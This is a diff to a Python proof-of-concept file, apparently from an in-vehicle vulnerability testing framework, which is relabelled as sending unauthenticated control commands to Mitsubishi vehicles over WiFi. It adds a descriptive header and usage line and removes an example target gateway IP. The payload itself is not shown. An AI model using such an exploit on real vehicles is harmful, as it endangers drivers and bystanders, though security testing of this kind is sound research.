@@ -1,3 +1,14 @@
+"""
+PoC Name: WiFi Unauthenticated Vehicle Control
+CVE: N/A
+Component: Wireless Stack
+Category: Wireless
+Severity: High
+CVSS: 7.5
+Description: 通过WiFi发送未认证车辆控制命令
+Prerequisites: 支持Monitor模式的无线网卡及scapy环境
+Usage: python3 37_WiFi_Unauth_Vehicle_Ctrl.py <target_ip> <target_port>
+"""
 import socket
 from iv_plugin_base import IVIVulnerabilityPlugin
 class MitsubishiWiFiExploit(IVIVulnerabilityPlugin):
@@ -38,12 +49,9 @@ class MitsubishiWiFiExploit(IVIVulnerabilityPlugin):
             finally:
                 sock.close()
 
-# 使用示例 (Outlander网关通常是 192.168.8.46):
-# poc = MitsubishiWiFiExploit(target_ip="192.168.8.46", target_port=8080)
-# poc.run()
 if __name__ == "__main__":
     if len(sys.argv) < 3:
-        print("Usage: python3 20_MitsubishiWiFiExploit.py <target_ip> <target_port>")
+        print("Usage: python3 37_WiFi_Unauth_Vehicle_Ctrl.py <target_ip> <target_port>")
         sys.exit(1)
     plugin = MitsubishiWiFiExploit({"target_ip": sys.argv[1], "target_port": sys.argv[2]})
     plugin.run_verify()
